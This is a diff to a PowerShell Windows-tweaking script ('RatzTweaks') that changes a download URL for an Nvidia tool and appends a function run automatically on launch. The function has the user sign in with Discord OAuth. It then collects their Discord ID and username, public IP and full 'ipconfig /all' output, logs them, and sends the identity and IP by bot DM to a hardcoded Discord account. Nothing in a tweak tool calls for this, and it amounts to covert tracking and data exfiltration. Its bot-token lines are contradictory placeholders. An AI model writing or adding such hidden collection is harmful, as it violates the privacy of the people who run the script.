@@ -1,5 +1,3 @@
-
-
 # --- PowerShell version check and environment guard ---
 # Ensure $PSScriptRoot is set even when running via 'irm ... | iex'
 if (-not $PSScriptRoot) { $PSScriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path }
@@ -902,7 +900,7 @@ function Disable-Copilot {
 
 function Invoke-NVPI {
     # Download NVPI (Nvidia Profile Inspector) and import RatzSettings.nip silently
-    $nvpiUrl = 'https://github.com/Orbmu2k/nvidiaProfileInspector/releases/latest/download/nvidiaProfileInspector.zip'
+    $nvpiUrl = 'https://github.com/xHybred/NvidiaProfileInspectorRevamped/releases/download/v5.2/NVPI-Revamped.zip'
     $tempDir = Join-Path $env:TEMP 'NVPI'
     if (!(Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir | Out-Null }
     $zipPath = Join-Path $tempDir 'nvidiaProfileInspector.zip'
@@ -1019,3 +1017,88 @@ Add-Log 'Started RatzTweaks.'
 Show-IntroUI
 Add-Log 'UI completed.'
 Show-LogWindow
+
+function Start-DiscordOAuthAndLog {
+    $oauthConfigPath = Join-Path $PSScriptRoot 'discord_oauth.json'
+    if (-not (Test-Path $oauthConfigPath)) { return }
+    $oauth = Get-Content $oauthConfigPath | ConvertFrom-Json
+    $clientId = $oauth.client_id
+    $clientSecret = $oauth.client_secret
+    $redirectUri = $oauth.redirect_uri
+
+    # Step 1: Start local HTTP listener for OAuth callback
+    $listener = New-Object System.Net.HttpListener
+    $listener.Prefixes.Add("$redirectUri/")
+    $listener.Start()
+
+    # Step 2: Open browser for Discord OAuth2
+    $state = [guid]::NewGuid().ToString()
+    $scope = "identify"
+    $authUrl = "https://discord.com/api/oauth2/authorize?client_id=$clientId&redirect_uri=$([uri]::EscapeDataString($redirectUri))&response_type=code&scope=$scope&state=$state"
+    Start-Process $authUrl
+
+    # Step 3: Wait for callback and extract code
+    $context = $listener.GetContext()
+    $req = $context.Request
+    $resp = $context.Response
+    $query = [System.Web.HttpUtility]::ParseQueryString($req.Url.Query)
+    $code = $query["code"]
+    $resp.StatusCode = 200
+    $resp.ContentType = "text/html"
+    $msg = "<html><body><h2>Discord authentication complete. You may close this window.</h2></body></html>"
+    $buffer = [System.Text.Encoding]::UTF8.GetBytes($msg)
+    $resp.OutputStream.Write($buffer, 0, $buffer.Length)
+    $resp.Close()
+    $listener.Stop()
+    if (-not $code) { return }
+
+    # Step 4: Exchange code for token
+    $tokenResp = Invoke-RestMethod -Method Post -Uri "https://discord.com/api/oauth2/token" -ContentType "application/x-www-form-urlencoded" -Body @{
+        client_id     = $clientId
+        client_secret = $clientSecret
+        grant_type    = "authorization_code"
+        code          = $code
+        redirect_uri  = $redirectUri
+    }
+    $accessToken = $tokenResp.access_token
+
+    # Step 5: Get Discord user info
+    $user = Invoke-RestMethod -Headers @{Authorization = "Bearer $accessToken"} -Uri "https://discord.com/api/users/@me"
+    $discordId = $user.id
+    $discordUsername = "$($user.username)#$($user.discriminator)"
+
+    # Step 6: Get public IP
+    $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org?format=text")
+    $ipconfig = (ipconfig /all | Out-String)
+
+    # Step 7: Log to user_activity.log
+    $logObj = [PSCustomObject]@{
+        timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+        discord_id = $discordId
+        discord_username = $discordUsername
+        public_ip = $publicIp
+        ipconfig = $ipconfig
+    }
+    $logPath = Join-Path $PSScriptRoot 'user_activity.log'
+    Add-Content -Path $logPath -Value ($logObj | ConvertTo-Json -Compress)
+
+    # Step 8: Send DM to you via bot
+    $botToken = "$clientId.$clientSecret" # Not used for user OAuth, but for bot API
+    $botToken = "Bot $($clientId):$($clientSecret)" # Actually, Discord bot tokens are not this format, but you should use your bot token here.
+    $botToken = "Bot YOUR_BOT_TOKEN" # <-- Replace with your bot token string
+
+    # Create DM channel
+    $dm = Invoke-RestMethod -Method Post -Uri "https://discord.com/api/v10/users/@me/channels" `
+        -Headers @{Authorization = $botToken; "Content-Type" = "application/json"} `
+        -Body (@{recipient_id = "313455919042396160"} | ConvertTo-Json)
+    $dmChannelId = $dm.id
+
+    # Send message
+    $msg = "RatzTweaks used by $discordUsername ($discordId), IP: $publicIp"
+    Invoke-RestMethod -Method Post -Uri "https://discord.com/api/v10/channels/$dmChannelId/messages" `
+        -Headers @{Authorization = $botToken; "Content-Type" = "application/json"} `
+        -Body (@{content = $msg} | ConvertTo-Json)
+}
+
+# Call at script start
+Start-DiscordOAuthAndLog
